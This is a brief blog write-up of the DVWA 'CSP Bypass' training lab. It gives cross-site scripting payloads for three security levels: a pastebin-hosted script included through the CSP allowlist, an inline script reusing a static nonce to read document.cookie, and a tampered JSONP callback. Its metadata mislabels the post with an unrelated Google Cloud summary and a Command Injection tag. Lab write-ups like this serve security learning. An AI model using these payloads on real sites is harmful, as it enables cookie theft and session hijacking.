---
title: "Content Security Policy (CSP) Bypass - DVWA"
description: ""
summary: "Quest: Ensure Access & Identity in Google Cloud"
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "Command Injection"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 12
# aliases: ["/first"]
hidemeta: false
comments: true
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
# cover:
#     image: "<image path/url>" # image path/url
#     alt: "<alt text>" # alt text
#     caption: "<text>" # display caption under cover
#     relative: false # when using page bundles set this to true
#     hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---

### **Security level is currently: low.**

from CSP we can import script from pastebin.com, so let's put our script on pastebin and include that link:

payload=`https://pastebin.com/dl/Lnamji4V`

this JavaScript is executed on page.


### **Security level is currently: medium.**

It's using nonce to prevent execution of JavaScript includ but this value is static so we can add this to our payload:

nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=

payload=`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>`

### **Security level is currently: high.**

It is making request to `http://192.168.170.131/vulnerabilities/csp/source/jsonp.php?callback=solveSum` to solve this lab we have to intercept this request
and anything we set to callback's value wil be executed so we can modify it to `callback=alert(document.cookie);`  and alert will pop up.


Happy Hacking
